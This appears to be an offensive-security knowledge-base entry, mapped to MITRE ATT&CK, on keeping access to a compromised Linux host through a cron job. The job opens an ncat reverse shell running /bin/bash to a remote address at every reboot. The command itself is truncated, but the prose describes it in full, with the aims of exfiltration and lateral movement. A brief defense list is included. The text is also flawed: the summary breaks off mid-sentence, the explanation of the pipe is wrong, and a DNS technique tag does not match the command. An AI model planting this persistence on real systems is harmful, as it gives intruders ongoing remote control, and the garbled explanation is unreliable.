---
id: 008b964a-b994-40c4-b850-4b8b279e0f62
name: Linux Crontab Reverse Shell Persistence
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:17.954297+00:00'
updated_at: '2023-04-10T20:34:18.585268+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Scheduled Task|T1053 - Scheduled Task]]'
- '[[Standard Application Layer Protocol|T1071 - Standard Application Layer Protocol]]'
sub_techniques:
- '[[DNS|T1071.004 - DNS]]'
tags:
- '[[Crontab - Reverse shell]]'
- '[[Linux - Persistence]]'
---

# Linux Crontab Reverse Shell Persistence

## Summary

The Linux Crontab Reverse Shell Persistence technique is used by attackers to establish a persistent backdoor on a compromised Linux system. The attacker uses the crontab utility to schedule a reverse shell connection to a remote server at a specified interval. Once the reverse shell is established

## Description

# Description

The Linux Crontab Reverse Shell Persistence technique is used by attackers to establish a persistent backdoor on a compromised Linux system. The attacker uses the crontab utility to schedule a reverse shell connection to a remote server at a specified interval. Once the reverse shell is established, the attacker can execute commands on the compromised system, exfiltrate data, and move laterally within the network.

The attacker gains access to the system by exploiting a vulnerability or using a phishing attack to trick a user into running a malicious script. The attacker then creates a crontab job that executes a reverse shell connection to a remote server. The reverse shell allows the attacker to interact with the compromised system and execute commands as if they were physically present on the system.

This technique can be used to maintain access to a compromised system, even if the initial point of entry is discovered and patched. It can also be used to establish a foothold within a network and move laterally to other systems.

 

## Requirements

1. Access to a compromised Linux system

1. Knowledge of crontab and reverse shell techniques

 

## Defense

1. Regularly monitor and review crontab jobs for suspicious activity

1. Implement network segmentation to limit lateral movement

1. Use firewalls and intrusion detection/prevention systems to detect and block reverse shell connections

 

## Objectives

1. Establish a persistent backdoor on a compromised Linux system

1. Execute commands on the compromised system

1. Exfiltrate data from the compromised system

1. Move laterally within the network

 

# Instructions

1. This command adds a new cron job to the crontab file that will run on every reboot. The command will sleep for 200 seconds and then connect back to the server at IP address 192.168.1.2 on port 4242 using ncat and execute /bin/bash.

 



**Code**: [[(crontab -l ; echo "@reboot sleep 200 && ncat 192.]]



> The command is composed of two parts separated by a semicolon. The first part retrieves the current crontab file using the 'crontab -l' command. The output of this command is then piped to the 'echo' command which appends a new cron job to the existing file. The new cron job is set to run on every reboot using the '@reboot' keyword. The job will sleep for 200 seconds using the 'sleep' command and then connect back to the server at IP address 192.168.1.2 on port 4242 using 'ncat' and execute '/bin/bash' using the '-e' option.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Execution|TA0002 - Execution]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Scheduled Task|T1053 - Scheduled Task]]
- [[Standard Application Layer Protocol|T1071 - Standard Application Layer Protocol]]

### Sub-Techniques

- [[DNS|T1071.004 - DNS]]

## Tags

- [[Crontab - Reverse shell]]
- [[Linux - Persistence]]


